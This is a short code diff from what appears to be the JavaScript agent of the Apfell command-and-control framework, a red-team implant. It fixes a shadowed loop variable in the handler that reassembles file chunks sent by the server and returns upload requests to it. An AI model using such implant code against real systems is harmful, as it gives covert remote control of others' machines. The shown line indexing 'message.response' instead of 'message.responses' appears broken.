@@ -185,14 +185,14 @@ connection.onmessage = function (e) {
             for (let i = 0; i < message.responses.length; i++) {
                 const response = message.response[i];
                 if (loads.length > 0) {
-                    for (let i = 0; i < loads.length; i++) {
-                        let equal = response.task_id.localeCompare(loads[i].task_id);
+                    for (let j = 0; j < loads.length; j++) {
+                        let equal = response.task_id.localeCompare(loads[j].task_id);
                         if (equal === 0) {
-                            let load = loads[i];
+                            let load = loads[j];
                             if (response.chunk_num < response.total_chunks) {
                                 let raw = atob(response.chunk_data);
                                 load.data.push(...raw);
-                                loads[i] = load;
+                                loads[j] = load;
                                 let resp = {'action':'upload','chunk_size': 1024000, 'chunk_num':(response.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
                                 let encodedResponse = JSON.stringify(resp);
                                 let final = apfell.apfellid + encodedResponse;
@@ -208,7 +208,7 @@ connection.onmessage = function (e) {
                                 let enc = JSON.stringify(outer_response);
                                 let final = apfell.apfellid + enc;
                                 let msg = btoa(unescape(encodeURIComponent(final)));
-                                loads[i] = {};
+                                loads[j] = {};
                                 out.push(msg);
                             }
                         }
